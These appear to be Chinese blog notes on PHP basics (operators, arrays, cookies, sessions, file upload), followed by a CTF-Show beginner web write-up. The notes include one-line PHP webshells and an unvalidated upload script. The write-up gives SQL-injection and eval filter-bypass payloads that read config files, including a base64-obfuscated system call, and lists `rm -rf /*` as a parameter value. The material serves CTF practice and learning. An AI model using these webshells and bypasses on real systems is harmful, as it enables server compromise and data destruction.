也称二元运算符，左值为变量，右值可为变量，表达式，数值等，右赋左 字符串运算符 字符串连接符 逻辑运算符 符号 与 and 或者是 &amp;&amp; 或 or 或者是 ` 非 ! 异或 xor 有且仅有一个是true，返回为true 与 运算高于 或 运算 比较运算符 描述 == 等于 === 绝对等于(包括类型相同) &gt; 大于 &gt;= 大于等于 &lt; 小于 &lt;= 小于等于 != 不等于 &lt;&gt; 不等于 !== 绝对不等于(包括类型不相同) 赋值运算符 作用 = 右赋左 += 加 -= 减 *= 乘 /= 除 %= 模 .= 连接两个字符串 字符串运算符 . 字符串连接符 其他运算符 ?: 三元运算符: $a = 3 &gt; 5 ? 3 : 5; `` 短引号 将字符串当作 命令 进行 @ 屏蔽作用 &lt;=&gt; 组合比较符—&gt;前者大于后者，值为1；前者等于后者，值为0；前者小于后者，值为-1 PHP（四）流程控制 顺序执行分支执行循环执行特殊流程控制语句 分支执行 123单向分支 if(判断条件)&#123;执行语句块&#125; 双向分支 if(判断条件)&#123;执行语句块&#125;else&#123;语句块2&#125;多项分支 elseif switch() case default break 循环执行 123while 循环变量初始化，循环变量改变，判断条件，输出结果do while 与 while 区别：无论如何先执行一次for 特殊流程控制语句 1234break 2; 跳出二层循环 continue; 跳过本次循环die(); 结束脚本执行exit(); 结束脚本执行 PHP（五）函数12345function 函数名(形参)&#123; 代码块 return 表达式; //返回值，不写默认返回NULL&#125; 函数调用： 1.实参按 顺序 传形参2.调用时函数互相独立，执行完毕后，返回调用的位置，继续向下执行 参数的传递 1. 默认方式：值传递，对形参的操作不会影响实参2. 引用传参：对形参的操作会对实参产生影响3. 默认参数：如果没有给函数传递实参，将取默认值 可变长度参数列表 123func_get_arg(1); 根据参数偏移量，从零开始计数，获取序号为1的参数func_get_args(); 返回一个包含函数参数的数组func_num_args(); 获取参数个数 可变函数（变量函数） 1231.可直接把 函数名 赋值给变量2.不能用于 echo ,print , unset() , isset() , empty(), ,include , require 等，需要使用自己的包装函数来将这些结构用作可变函数3.结构：$a($b); 例子1： 1234567891011121314&lt;?phpheader(&quot;Content-type:text/html;charset=gb2312&quot;);function test1()&#123; echo &quot;This is func &quot;.__FUNCTION__; echo &quot;&lt;br /&gt;&quot;.func_get_arg(0); &#125;function test2()&#123; echo &quot;This is func&quot;.__FUNCTION__; echo &quot;&lt;br /&gt;&quot;.func_get_arg(0);&#125;$a=&quot;test1&quot;; //引号中为函数名$a(&quot;jiayou&quot;); //一个函数，函数名为$a,相当于test1(&quot;jiayou&quot;);?&gt; 结果为例子2： 12345&lt;?phpheader(&quot;Content-type:text/html;charset=gb2312&quot;);$a=&quot;system&quot;;$a(&quot;ipconfig&quot;);//一个函数，函数名为$a,相当于system(&quot;ipconfig&quot;);?&gt; 结果为最简单的后门 (一句话木马) 12345&lt;?phpheader(&quot;Content-type:text/html;charset=gb2312&quot;);$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);?&gt;url 输入： 路径 + ?a=system&amp;&amp;b=whoami 等其他命令，中间不能有空格 递归函数 1指在函数内部自己调用自己的函数 内部(内置) 函数 PHP提供了许多现成的 函数 与 结构 ，还有一些函数需要开启特定的 PHP扩展模块，否则使用时会得到一个错误 “未定义该函数” 。这些扩展模块需要 手动修改php.ini文件 即可正常使用。 PHP（六）数组一、概述1.数组是一种变量类型，复合数据类型2.数组的数据由 键值对 组成 123键值对:中括号[]中的为 键名key 内容为 键值value 3.数组中元素可以存放 不同类型 的数据，包括整型，浮点型，布尔类型等 二、数组的分类 12索引数组：键值对为整型的正数关联数组：键值对为具有语义的字符串 三、数组的创建 123456789101112131415161718方法一：变量+[]=1.未指定键名的情况下给数组赋值，键名默认从 零 开始计数，依次增大$stu[] = &#x27;xiaoming&#x27;;$stu[] = 18;$stu[] = true;$stu[] = 99;//键名依次为 0，1，2，32.可手动定键名$stu[20] = &#x27;xiaoming&#x27;;$stu[80] = 18;$stu[70] = true;$stu[] = 99;//最后一个键名为 81$stu[&#x27;name&#x27;] = &#x27;xiaoming&#x27;;$stu[&#x27;age&#x27;] = 18;$stu[&#x27;sex&#x27;] = true;$stu[&#x27;grade&#x27;] = 99;//字符串定有意义的键名 1234567891011方法二：变量+array()=1.未指定键名，默认从零开始，依次增大$stu = array(&#x27;xiaoming&#x27;,18,true,99);//键名依次为 0，1，2，32.指定键名，=&gt;符号$stu = array( &#x27;name&#x27; =&gt; &#x27;xiaoming&#x27;, &#x27;age&#x27; =&gt; 18, &#x27;sex&#x27; =&gt; true, &#x27;grade&#x27; =&gt; 99); 四、数组元素的访问 1231.读取：echo $stu[&#x27;name&#x27;];//中括号中为键名2.添加：$stu[&#x27;rank&#x27;] = 30;//若为指定键名，默认从零开始 3.修改：$stu[&#x27;grade&#x27;] = 80; 五、数组的遍历 1234567891011121314151617181.for循环 （适用于 索引数组）$stu = array(&#x27;xiaoming&#x27;,18,true,99);for($i=0;$i&lt;=count($stu);$i++)&#123; echo $stu[$i].&#x27;&lt;br /&gt;&#x27;;&#125;2.foreach 语言结构 （适用于 关联数组）$stu2 = array( &#x27;name&#x27; =&gt; &#x27;xiaoming&#x27;, &#x27;age&#x27; =&gt; 18, &#x27;sex&#x27; =&gt; true, &#x27;grade&#x27; =&gt; 99);foreach($stu2 as $key =&gt; $value)&#123; echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br /&gt;&#x27;;&#125; 六、二维数组 123456781.创建：$stus = array( 1001=&gt;array(&#x27;name&#x27;=&gt;&#x27;xiaohong&#x27;,&#x27;age&#x27;=&gt;20,&#x27;sex&#x27;=&gt;false,&#x27;garde&#x27;=&gt;78), 1002=&gt;array(&#x27;xiaoming&#x27;,18,true,99));2.读取：echo $stus[1001][&#x27;age&#x27;]; 常用函数： 12345678910count();array_key_exists();in_array();array_keys();array_change_key_case();array_count_values();array_fill();array_filter();array_values(); PHP（七）预定义超全局数组变量函数内部外部都能使用| 名称 | 作用 || ——— | ———————————————————— || $GLOBALS | 引用全局作用域中可用的全局变量 || $_SERVER | 一个包含头信息(header)，路径(path)，以及脚本位置(script locations)等信息的数组（服务器 客户端 信息等） || $_GET | 通过 URL参数 传递给当前脚本变量的数组 || $_POST | 当 HTTP POST 请求的 Coutent-Type 是 application/x-www-form-urlencoded multipart/form-data 时。会将变量以关联数组的形式传入当前脚本 || $_FILES | 经由 HTTP POST方法文件上传而提交至脚本的变量 || $_COOKIE | 通过 HTTP Cookies 方式传递给当前脚本变量的数组 || $_SESSION | 完成对 session 数据的读写 || $_REQUEST | 默认情况下包含$_GET,$_POST,$_COOKIE的数组 || $_ENV | 通过环境方式传递给当前脚本的变量的数组 | $_GET 123456接收来自URL传递的参数接收方式：url+ ?a=b&amp;c=d输入时将参数的名a 为键名参数的值b 为键值标签中 name 作为键名 value 作为键值 $_POST 123http请求报文的请求正文中当 HTTP POST 请求的Content-Type 是application/x-www-form-urlencoded (默认)multipart/form-data 文件时，会将变量以关联数组形式传入当前脚本 $_FILES 1用来获取通过 HTTP POST 方法 上传文件 的相关信息。如果为单个文件上传，那么 $_FILES 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。 $_GET,$_POST,$_COOKIE 三者的区别与联系： 详情请点击这里 更改PHP缓存路径 1231.打开 php.ini 文件2.将代码 ;upload_tmp_dir = 前面的分号删掉，在等号后面写上要修改的路径即可 PHP（八）字符串1234567&lt;?php $a = &quot;qwe&quot;; $b = &#x27;asd&#x27;; //echo = $a.$b; echo &quot;a=&quot;.$a.&quot;&lt;br/&gt;&quot;; //双引号解释变量，进行转义 echo &quot;b=&quot;.$b.&quot;&lt;br/&gt;&quot;; //单引号不解释变量，不进行转义?&gt; 123456789101112131415161718192021222324252627282930313233343536$a = &quot;qwertyaaty&quot;;strlen($a); //10mb_strlen($a); //10strpos($a,&#x27;ty&#x27;); //4strpos($a,&#x27;TY&#x27;); //falsestripos($a,&#x27;TY&#x27;);//4 //i 表示 不区分大小写strrpos(); //8 //最后一次出现的位置str_replace(&quot;qwe&quot;,&quot;mmm&quot;,$a); //$a = &quot;mmmrtyaaty&quot;str_ireplace();strstr(&quot;baidu.com&quot;,&quot;u&quot;); //返回 u.comstristr();substr(&quot;baidu.com&quot;,2,3); //0开始 返回 idustrrchr(&quot;baidu.com&quot;,&quot;u.&quot;); //只取第一个字符 开始位置之后的内容//返回 u.com$b = &quot;www.baidu.com&quot;;split(); //正则分割$arr = explode(&quot;.&quot;,$b); //返回 数组元素分别是 www baidu com //字符串分割$new_arr = implode($arr,&quot;.&quot;); //将一个一维数组转换成 字符串trim(); //去除首尾的空白符ltrim();rtrim();$user = &quot;www&#x27;&quot;;echo addslashes($user); //返回 www\\&#x27; //使用反斜线 引用字符串$c = &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;; echo $c; //返回弹框echo htmlspecialchars($c); //返回 &lt;script&gt;alert(1)&lt;/script&gt; 由于 将其变成 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;gt; PHP（九）会话技术盗取 Cookie 会话劫持 产生原因：HTTP协议是无连接，无状态的，无法记住客户端的信息。于是产生了会话技术：Session , cookie **Cookie : **由服务端生成，由服务器将数据通过HTTP响应储存到浏览器上，则浏览器在以后就可直接携带上这个 Cookie 访问该服务器。 客户端第一次请求：PHP 的 setcookie 函数 将 cookie数据 通过HTTP协议与响应头传给浏览器，浏览器第一次响应时将Cookie数据保存到浏览器上。 客户端再次发送请求：首先自动检测本地是否存在Cookie数据，若存在，直接在请求头当中将Cookie数据发送给服务器；PHP执行自动判断浏览器请求中是否携带Cookie，有的话，自动保存到 $_COOKIE 当中；利用 $ _COOKIE 访问 Cookie数据。 **Session : **与浏览器无关，以Cookie为基础，将重要的数据保存到服务端，同时将能够唯一表示这个数据的数据以COOKIE的形式保存在客户端。 客户端第一次请求：创建 SESSIONID ；初始化超全局变量 $_SESSION；在php指定目录创建SESSIONId为名的文件；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并 将SESSIONID以SETCOOKIE的形式返回给客户端，相当于 将SESSIONID 写入 COOKIE 当中。 客户端再次发送请求：检测到 客户端的COOKIE中的SESSIONID ；初始化超全局变量$_SESSION；找到文件，反序列化读取数据存储到$_SESSION中；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。 登陆判断： 用户成功登录之后，服务器通过 SESSION机制 将用户信息存储到服务端，并将 SESSIONID 以 SETCOOKIE 的形式返回给客户端。 用户下一次访问站点时，自动携带COOKIE信息，服务端根据COOKIE当中的 SESSIONID 进行数据匹配，存在证明已登录过。 COOKIEHTTP协议：客户端发出请求，服务器给出响应 cookie 概述 123456781.cookie：由 服务器生成 发送给客户端 的储存在用户本地终端(客户端/浏览器)上的数据，类型为“小型文本文件”。当每次客户端浏览器在发送请求的时候，都会携带该 cookie 信息。是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。2.注：这个文件与特定的 Web 文档关联在一起, 保存了该客户机访问这个Web 文档时的信息, 当客户机再次访问这个 Web文档时这些信息可供该文档使用。 3.举例：一个 Web 站点可能会为每一个访问者产生一个唯一的ID, 然后以 Cookie文件的形式保存在每个用户的机器上。每次客户端浏览器在发送请求的时候，都会携带cookie信息。在这个文件夹里每一个文件都是一个由“名/值”对（K-V）组成的文本文件,另外还有一个文件保存有所有对应的Web 站点的信息。 cookie 的性质 1234567name 名称value 值expire cookie生存期path 有效路径domain 指定可以访问该 Cookie 的 Web站点 或域secure 设置为true时，只有安全连接存在时(https)才会设置cookiehttponly 只能通过 http协议 访问，不能通过js 访问 设置cookie的语句 12345678910setcookie();共有7个属性，NULL为默认，只有全部默认时可以省略不写。例如：setcookie(&#x27;名称&#x27;,&#x27;值&#x27;,null,null,null,null,null); 正确setcookie(&#x27;名称&#x27;,&#x27;值&#x27;); 正确setcookie(&#x27;名称&#x27;,&#x27;值&#x27;,time()+600); 正确 过期时间为10分钟不可设置某个参数为空,如：setcookie(&#x27;&#x27;,&#x27;&#x27;,,,,,true); 错误服务器接收cookie信息：$_COOKIE查看cookie信息：控制台 接收 cookie 信息 1234通过 预定义超全局数组 $_COOKIE 接收setcookie(&quot;num&quot;,10);$num = $_COOKIE[&quot;num&quot;];var_dump($num); 1234567891011//计算页面访问次数&lt;?php$num = 0;if(isset($_COOKIE[&quot;pass&quot;]))&#123; setcookie(&quot;pass&quot;,1);&#125;else&#123; $num = $_COOKIE[&quot;pass&quot;]; $num++; setcookie(&quot;pass&quot;,$num); echo $_COOKIE[&quot;pass&quot;];&#125; COOKIE示例：简单登录界面 1234567891011welcome.php&lt;meta charset = &quot;utf-8&quot;&gt;&lt;h2&gt;心之所向论坛&lt;/h2&gt;&lt;?phpif(isset($_COOKIE[&#x27;name&#x27;]))&#123; echo &quot;欢迎您！&#123;$_COOKIE[&#x27;name&#x27;]&#125;&lt;br /&gt;&lt;a href=&#x27;./logout.php&#x27;&gt;注销&lt;/a&gt;&quot;;&#125;else&#123; echo &quot;&lt;a href=&#x27;./login.php&#x27;&gt;请登录&lt;/a&gt;&quot;;&#125;?&gt; 1234567891011121314151617181920212223242526login.php&lt;meta charset = &quot;utf-8&quot;&gt;&lt;?phpif(isset($_POST[&#x27;usersubmit&#x27;]))&#123; if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] == &#x27;zzyy&#x27; &amp;&amp; isset($_POST[&#x27;userpasswd&#x27;]) &amp;&amp; $_POST[&#x27;userpasswd&#x27;] == &#x27;123456&#x27;)&#123; if(setcookie(&#x27;name&#x27;,&#x27;zzyy&#x27;))&#123; echo &quot;登陆成功！&lt;a href=&#x27;./welcome.php&#x27;&gt;回到主界面&lt;/a&gt;&quot;; &#125;else&#123; echo &quot;cookie设置错误&quot;; &#125; &#125;else echo &quot;用户名或密码错误，&lt;a href=&#x27;./login.php&#x27;&gt;请重新登录&lt;/a&gt;&quot;;&#125;else&#123;$html=&lt;&lt;&lt;HTML&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot; &gt;&lt;br /&gt;密码：&lt;input type=&quot;password&quot; name=&quot;userpasswd&quot; &gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;usersubmit&quot; value=&quot;登录&quot;&gt;&lt;/form&gt;HTML; echo $html;&#125;?&gt; 123456cookie的注销：更改cookie的生存期为过去logout.php&lt;?phpsetcookie(&#x27;name&#x27;,$_COOKIE[&#x27;name&#x27;],time()-3600);?&gt; 1存在的问题：cookie的窃取，欺骗--由于cookie信息是 服务端发送给浏览器 而存储在 客户端 的 12345解决：session机制：session信息是储存在服务端（tmp缓存文件当中）的，相较于cookie而言，较安全session属性：SESSIONID注：session_start();之前不能有任何输出,将其放于php代码开头即可 SESSION12345开启session机制：session_start(); //每次都要写 $_SESSION[&quot;pass&quot;] = &quot;123456&quot;;释放：session_destroy(); SESSION示例：简单登录界面 12345678910111213welcome.php&lt;meta charset=&quot;utf-8&quot;&gt;&lt;h2&gt;欢迎来到主界面&lt;/h2&gt;&lt;?phpsession_start();if(isset($_SESSION[&#x27;name&#x27;]) &amp;&amp; $_SESSION[&#x27;name&#x27;] == &#x27;zzyy&#x27;)&#123; echo &quot;欢迎您！&#123;$_SESSION[&#x27;name&#x27;]&#125;&quot;;&#125;else&#123; echo &quot;&lt;a href=&#x27;./login.php&#x27;&gt;请登录&lt;/a&gt;&quot;;&#125;echo &quot;&lt;br /&gt;&lt;a href=&#x27;./logout.php&#x27;&gt;注销&lt;/a&gt;&quot;;?&gt; 123456789101112131415161718192021222324login.php &lt;meta charset=&quot;utf-8&quot;&gt;&lt;?phpsession_start();//开启session机制if(isset($_POST[&#x27;usersubmit&#x27;]))&#123; if(isset($_POST[&#x27;username&#x27;])&amp;&amp; isset($_POST[&#x27;userpasswd&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]==&#x27;zzyy&#x27; &amp;&amp; $_POST[&#x27;userpasswd&#x27;]==123456 )&#123; $_SESSION[&#x27;name&#x27;]=$_POST[&#x27;username&#x27;]; echo &quot;登录成功！&lt;a href=&#x27;./welcome.php&#x27;&gt;返回首页&lt;/a&gt;&quot;; &#125;else&#123; echo &quot;用户名或密码错误！&lt;a href=&#x27;./login.php&#x27;&gt;请重新登录&lt;/a&gt;&quot;; &#125; &#125;else&#123;$a=&lt;&lt;&lt;HTML&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;h2&gt;用户登录&lt;/h2&gt;用户名&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt;密码&lt;input type=&quot;password&quot; name=&quot;userpasswd&quot;&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;usersubmit&quot; value=&quot;登录&quot; &gt;&lt;/form&gt;HTML;echo $a;&#125;?&gt; 12345678910session 的注销：方法一：session_destroy()函数(运行该函数，服务器会将session缓存清空，但缓存文件依然存在)方法二：关闭浏览器 logout.php&lt;?phpsession_start();session_destroy();?&gt; PHP（十）文件操作文件包含12345require #报错不执行 可包含多次require_once # 只包含一次include #报错 继续执行 可包含多次include_once # 只包含一次 文件上传123456$_FILES数组内容：$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 上传文件的大小，单位为字节 $_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 该文件上传相关的错误代码 示例一：有验证 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpinclude &#x27;../config.php&#x27;;include &#x27;../common.php&#x27;;include &#x27;../head.php&#x27;;include &#x27;../menu.php&#x27;;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $is_upload = false; $msg = null; if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //mime check $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //check filename $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); echo &quot;&lt;hr /&gt;&quot;; var_dump($file); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125; &#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125;?&gt; 示例二：无验证 upload.html 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;1.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;upload&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 1.php 123456789101112131415161718192021222324252627&lt;?php header(&quot;Content-type:text/html;charset=utf-8&quot;); //var_dump($_FILES); if(empty($_FILES))&#123; echo &quot;请上传文件&quot;; &#125;else&#123; //echo $_FILES[&#x27;upload&#x27;][&quot;name&quot;]; define(&quot;PATH&quot;,dirname(__DIR__)); $path = PATH.&quot;/&quot;.&quot;upload&quot;.&quot;/images&quot;; $dir1 = date(&quot;Ym&quot;); $dir2 = date(&quot;d&quot;); $fullPath = $path.&quot;/&quot;.$dir1.&quot;/&quot;.$dir2; if(is_dir($fullPath))&#123; echo &quot;&quot;; &#125;else&#123; mkdir($fullPath,0777,true); &#125; //将文件名 进行随机数命名 $filename = rand(1000,9999); $filetype = strrchr($_FILES[&#x27;upload&#x27;][&#x27;name&#x27;], &#x27;.&#x27;); $fileName = $filename.$filetype; move_uploaded_file($_FILES[&#x27;upload&#x27;][&#x27;tmp_name&#x27;],$fullPath.&quot;/&quot;.$fileName); &#125; 2.php 1234567891011121314&lt;?php define(&quot;PATH&quot;,dirname(__DIR__)); $path = PATH.&quot;/&quot;.&quot;upload&quot;.&quot;/images&quot;; $dir1 = date(&quot;Ym&quot;); $dir2 = date(&quot;d&quot;); $fullPath = $path.&quot;/&quot;.$dir1.&quot;/&quot;.$dir2; //创建我们要上传的目录 if(is_dir($fullPath))&#123; //echo &quot;&quot;; &#125;else&#123; mkdir($fullPath,0777,true); &#125; 文件管理 函数1234567891011121314151617181920 &lt;?php //echo realpath(&quot;.&quot;);//输出指定路径 $filename = opendir(&quot;.&quot;); while($row = readdir($filename))&#123; echo $row.&quot;&lt;br /&gt;&quot;; &#125; closedir($filename); if(is_dir(&quot;../upload&quot;))&#123; //判断某 目录 是否存在 echo &quot;yes&quot;; &#125;else echo &quot;no&quot;; echo file_get_contents(&quot;1.php&quot;); //从指定文件读出内容 file_put_contents(&quot;111.txt&quot;, &quot;123456&quot;); //在指定目录写入文件 unlink(&quot;111.txt&quot;); //删除指定文件?&gt; 输出指定目录下所有文件 一句话木马： 1234567示例： &lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;解释：1.&lt;?php ?&gt;--php代码的标识，使服务器按照 php代码去解析2.@--当执行错误的时候，不会报错3.eval()--把字符串作为 php代码去执行4.$_POST--以POST方式获取 cmd参数","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/tags/PHP/"}],"author":"xizhi-future"},{"title":"CTF-Show-萌新计划","slug":"CTF-Show-萌新计划","date":"2021-11-19T07:17:08.000Z","updated":"2021-11-19T07:17:55.004Z","comments":true,"path":"2021/11/19/CTF-Show-萌新计划/","link":"","permalink":"https://xizhi-future.github.io/2021/11/19/CTF-Show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92/","excerpt":"","text":"CTF Show — 萌新计划Web 1-7 12345678&lt;?php//echo intval(&#x27;1000&#x27;);$a = $_GET[&#x27;a&#x27;];if(intval($a) &gt; 999 )&#123; echo &#x27;xxx&#x27;;&#125;else&#123; echo &#x27;success&#x27;;&#125; 123# 进制转换0x38e #十六进制0b1111101000 # 二进制 1234# 取反 异或 与运算~~1000200^800992|8 12345# 运算符200*510/0.01--1000200%2b800 123# sql 注入?id=1 or 1=1id=id# 123?id=(1000)?id=&#x27;1000&#x27;?id=&quot;1000&quot; Web 11234567891011121314151617181920212223242526272829303132333435363738394041&lt;html&gt;&lt;head&gt; &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;?php# 包含数据库连接文件include(&quot;config.php&quot;);# 判断get提交的参数id是否存在if(isset($_GET[&#x27;id&#x27;]))&#123; $id = $_GET[&#x27;id&#x27;]; # 判断id的值是否大于999 if(intval($id) &gt; 999)&#123; # id 大于 999 直接退出并返回错误 die(&quot;id error&quot;); &#125;else&#123; # id 小于 999 拼接sql语句 $sql = &quot;select * from article where id = $id order by id limit 1 &quot;; echo &quot;执行的sql为：$sql&lt;br&gt;&quot;; # 执行sql 语句 $result = $conn-&gt;query($sql); # 判断有没有查询结果 if ($result-&gt;num_rows &gt; 0) &#123; # 如果有结果，获取结果对象的值$row while($row = $result-&gt;fetch_assoc()) &#123; echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;; &#125; &#125; # 关闭数据库连接 $conn-&gt;close(); &#125; &#125;else&#123; highlight_file(__FILE__);&#125;?&gt;&lt;/body&gt;&lt;!-- flag in id = 1000 --&gt;&lt;/html&gt; 需要满足 intval($id) &lt;= 999 , 但又要 id = 1000 测试 12?id=&quot;1000&quot;?id=&#x27;1000&#x27; 其它绕过方式： 12345?id=0x3e8 # 数据库中查询可使用 十六进制select * from article where id = 0x3e8 order by id limit 1?id=125&lt;&lt;3 # 不知?id=680|320 # 不知 Web 212?id=&quot;1000&quot;?id=&#x27;1000&#x27; Web 312?id=&quot;1000&quot;?id=&#x27;1000&#x27; Web 412?id=&quot;1000&quot;?id=&#x27;1000&#x27; Web 51if(preg_match(&quot;/\\&#x27;|\\&quot;|or|\\||\\-|\\\\\\|\\/|\\\\*|\\&lt;|\\&gt;|\\!|x|hex|\\(|\\)|\\+|select/i&quot;,$id)) 过滤引号 取反绕过 1?id=~~1000 异或绕过 123450^0 = 01^0 = 10^1 = 11^1 = 0即同为假，异为真 1?id= 二进制绕过 1?id=0b1111101000 # 0b 开头表示二进制 Web 61if(preg_match(&quot;/\\&#x27;|\\&quot;|or|\\||\\-|\\\\\\|\\/|\\\\*|\\&lt;|\\&gt;|\\^|\\!|x|hex|\\(|\\)|\\+|select/i&quot;,$id)) 1?id=0b1111101000 # 0b 开头表示二进制 Web 71if(preg_match(&quot;/\\&#x27;|\\&quot;|or|\\||\\-|\\\\\\|\\/|\\\\*|\\&lt;|\\&gt;|\\^|\\!|\\~|x|hex|\\(|\\)|\\+|select/i&quot;,$id)) 1?id=0b1111101000 # 0b 开头表示二进制 Web 8 — ?flag=rm -rf /*123456789101112131415161718192021222324&lt;html&gt;&lt;head&gt; &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;?php# 包含数据库连接文件,key flag 也在里面定义include(&quot;config.php&quot;);# 判断get提交的参数id是否存在if(isset($_GET[&#x27;flag&#x27;]))&#123; if(isset($_GET[&#x27;flag&#x27;]))&#123; $f = $_GET[&#x27;flag&#x27;]; if($key===$f)&#123; echo $flag; &#125; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 1?flag=rm -rf /* Web 91234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 12?c=highlight_file(&#x27;config.php&#x27;);?c=system(&#x27;cat config.php&#x27;); Web 101234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 123?c=show_source(&#x27;config.php&#x27;);?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);?c=passthru(&#x27;cat config.php&#x27;); Web 111234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight|cat/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 123?c=show_source(&#x27;config.php&#x27;);?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;tac config.php&#x27;);?c=passthru(&#x27;tac config.php&#x27;); Web 121234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight|cat|\\.|php|config/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 12345?c=passthru(&#x27;tac confi*&#x27;);?c=passthru(&#x27;tac con&quot;&quot;fig*&#x27;);?c=passthru(&#x27;tac con\\fig*&#x27;);?c=$a=base64_decode(&quot;c3lzdGVt&quot;);$b=base64_decode(&quot;Y2F0IGNvbmZpZy5waHA=&quot;);$a($b);#system(&#x27;cat config.php&#x27;); Web 13 — 过滤 ；1234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight|cat|\\.|\\;|file|php|config/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); 